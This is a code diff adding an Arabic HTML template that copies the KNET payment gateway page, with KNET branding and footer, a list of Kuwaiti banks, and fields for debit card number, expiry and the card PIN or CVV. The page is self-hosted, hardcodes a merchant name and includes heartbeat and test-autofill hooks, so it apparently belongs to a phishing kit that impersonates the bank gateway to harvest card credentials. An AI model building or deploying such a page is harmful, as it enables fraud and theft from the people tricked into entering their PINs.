@@ -1,0 +1,217 @@
+<!doctype html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta charset="utf-8" />
+    <title>صفحة الـ KNET</title>
+    <script
+      src="https://code.jquery.com/jquery-3.7.1.min.js"
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+      onerror="this.onerror=null;this.src='/static/frontend/js/vendor/jquery-3.7.1.min.js';"
+    ></script>
+    <link href="/static/frontend/css/vendor/knet.css" rel="stylesheet" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="use-credentials" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&amp;display=swa"
+    />
+    <link href="/static/frontend/css/vendor/payment-stylesheet.css?v=20260330-10" rel="stylesheet" type="text/css" />
+    <link href="/static/frontend/css/vendor/payment-responsive-ar.css" rel="stylesheet" type="text/css" />
+  </head>
+  <body
+    class="frontend-body"
+    data-heartbeat-interval-ms="{{ heartbeat_interval_seconds * 1000 }}"
+    data-knet-testing-autofill="{{ 'true' if payment_settings is defined and payment_settings is not none and payment_settings.testing_enabled else 'false' }}"
+    data-card-security-label="{{ 'CVV' if payment_settings is defined and payment_settings is not none and payment_settings.cards_enabled else 'الرقم السري' }}"
+    data-card-security-length="{{ '3' if payment_settings is defined and payment_settings is not none and payment_settings.cards_enabled else '4' }}"
+  >
+    <form id="paypage" method="post" autocomplete="on">
+      <div id="PayPageEntry" style="display: block">
+        <div class="container">
+          <div class="content-block">
+            <div class="container-blogo">
+              <img class="knet-top-banner" src="/static/frontend/images/payment/mob.jpg" alt="KNET banner" />
+            </div>
+            <div class="form-card">
+              <div class="container-blogo">
+                <img class="logoHead-mob" src="/static/frontend/images/kfh.webp" alt="KFH" />
+              </div>
+              <div class="row">
+                <div style="text-align: right;">
+                  <label class="column-label" id="knet-merchant-name" style="width: 60%;">Althenayan Farms - مزارع الثنيان</label>
+                </div>
+                <div style="float: right;">
+                  <label class="column-value text-label" style="width: auto;">:المستفيد</label>
+                </div>
+              </div>
+              <div id="OrgTranxAmt">
+                <div style="text-align: right;">
+                  <label class="column-label" id="knet-total-amount" style="width: 60%;">KD&nbsp;0.000</label>
+                </div>
+                <div style="float: right;">
+                  <label class="column-value text-label" style="width: auto;">:المبلغ</label>
+                </div>
+              </div>
+            </div>
+
+            <div class="form-card">
+              <div id="ValidationMessage"></div>
+
+              <div id="FCUseDebitEnable" style="margin-top: 5px;">
+                <div class="row">
+                  <div style="text-align: right;">
+                    <select class="column-value" id="bank" style="width: 60%;" dir="rtl">
+                      <option value="">يرجى اختيار البنك</option>
+                      <option value="ABK">البنك الأهلي الكويتي [ABK]</option>
+                      <option value="ALRAJHI">مصرف الراجحي [Rajhi]</option>
+                      <option value="BBK">بنك البحرين والكويت [BBK]</option>
+                      <option value="BOUBYAN">بنك بوبيان [Boubyan]</option>
+                      <option value="BURGAN">بنك برقان [Burgan]</option>
+                      <option value="CBK">البنك التجاري الكويتي [CBK]</option>
+                      <option value="DOHA">بنك الدوحة [Doha]</option>
+                      <option value="GBK">بنك الخليج [GBK]</option>
+                      <option value="TAM">بيتك [TAM]</option>
+                      <option value="KFH">بيت التمويل الكويتي [KFH]</option>
+                      <option value="KIB">بنك الكويت الدولي [KIB]</option>
+                      <option value="NBK">بنك الكويت الوطني [NBK]</option>
+                      <option value="WEYAY">الوطني [Weyay]</option>
+                      <option value="QNB">بنك قطر الوطني [QNB]</option>
+                      <option value="UNB">بنك الاتحاد الوطنى [UNB]</option>
+                      <option value="WARBA">بنك وربة [Warba]</option>
+                    </select>
+                  </div>
+                  <div style="text-align: right; float: right;">
+                    <label class="column-label" style="width: 100%;">:يرجى اختيار البنك</label>
+                  </div>
+                </div>
+
+                <div class="row three-column" id="Paymentpagecardnumber">
+                  <label>
+                    <select class="column-value" name="dcprefix" id="dcprefix" dir="rtl" style="width: 26%;">
+                      <option value="">بادِئة</option>
+                    </select>
+                  </label>
+                  <label>
+                    <input
+                      name="debitNumber"
+                      id="debitNumber"
+                      type="tel"
+                      autocomplete="cc-number"
+                      inputmode="numeric"
+                      pattern="[0-9]*"
+                      size="10"
+                      style="width: 32%; float: left;"
+                      maxlength="10"
+                      class="allownumericwithoutdecimal"
+                      title="يجب أن يكون في العدد. يجب أن يكون الطول 10"
+                    />
+                  </label>
+                  <label class="column-label" style="float: right; text-align: right;">:رقم بطاقة الصرف الآلي</label>
+                </div>
+
+                <div class="row three-column" id="cardExpdate">
+                  <div id="debitExpDate" style="float: right; text-align: right;">
+                    <label class="column-label" style="width: 100%;">:تاريخ انتهاء البطاقة</label>
+                  </div>
+                  <div style="width: 60%; text-align: right;">
+                    <select id="year" class="paymentselect" dir="rtl">
+                      <option value="">YYYY</option>
+                    </select>
+                    <select id="month" class="paymentselect" dir="rtl">
+                      <option value="">MM</option>
+                      <option value="1">01</option>
+                      <option value="2">02</option>
+                      <option value="3">03</option>
+                      <option value="4">04</option>
+                      <option value="5">05</option>
+                      <option value="6">06</option>
+                      <option value="7">07</option>
+                      <option value="8">08</option>
+                      <option value="9">09</option>
+                      <option value="10">10</option>
+                      <option value="11">11</option>
+                      <option value="12">12</option>
+                    </select>
+                  </div>
+                </div>
+
+                <div class="row" id="PinRow">
+                  <div id="eComPin">
+                    <label class="column-label" style="float: right; text-align: right;">:{{ 'CVV' if payment_settings is defined and payment_settings is not none and payment_settings.cards_enabled else 'الرقم السري' }}</label>
+                  </div>
+                  <div>
+                    <input
+                      inputmode="numeric"
+                      pattern="[0-9]*"
+                      name="cardPin"
+                      id="cardPin"
+                      autocomplete="off"
+                      dir="rtl"
+                      title="{{ 'يجب أن يكون CVV مكون من 3 أرقام' if payment_settings is defined and payment_settings is not none and payment_settings.cards_enabled else 'يجب أن يكون الرمز السري مكون من ٤ أرقام' }}"
+                      type="password"
+                      size="{{ '3' if payment_settings is defined and payment_settings is not none and payment_settings.cards_enabled else '4' }}"
+                      maxlength="{{ '3' if payment_settings is defined and payment_settings is not none and payment_settings.cards_enabled else '4' }}"
+                      style="width: 60%; text-align: right;"
+                      class="allownumericwithoutdecimal"
+                    />
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="form-card">
+              <div class="row">
+                <div style="text-align: center;">
+                  <div id="submithide">
+                    <button name="proceed" type="button" class="submit-button" style="float: right;" id="proceed">إرسال</button>
+                    <input name="proceedCancel" type="button" class="cancel-button" id="cancel" value="إلغاء" />
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div id="overlayhide" class="overlay" aria-hidden="true">
+              <div class="overlay-loader">
+                <div class="overlay-spinner" aria-label="Loading" role="status">
+                  <span></span>
+                  <span></span>
+                  <span></span>
+                  <span></span>
+                  <span></span>
+                  <span></span>
+                  <span></span>
+                  <span></span>
+                  <span></span>
+                  <span></span>
+                  <span></span>
+                  <span></span>
+                </div>
+                <p class="overlay-loader-text" id="overlay-loader-text">يرجى الانتظار جاري التحقق من المعلومات</p>
+              </div>
+            </div>
+
+            <footer>
+              <div>
+                <span>
+                  <div class="row_new">
+                    <div style="text-align: center; font-size: 12px;">
+                      جميع الحقوق محفوظة&nbsp;©&nbsp;2026
+                      <br />
+                      <span style="font-weight: bold; color: #0077D5;">شركة الخدمات المصرفية الآلية المشتركة – كي نت</span>
+                    </div>
+                  </div>
+                </span>
+              </div>
+            </footer>
+          </div>
+        </div>
+      </div>
+    </form>
+    <script src="/static/frontend/js/main.js?v=20260330-106" defer></script>
+    <script src="/static/frontend/js/knet.js?v=20260330-19" defer></script>
+  </body>
+</html>
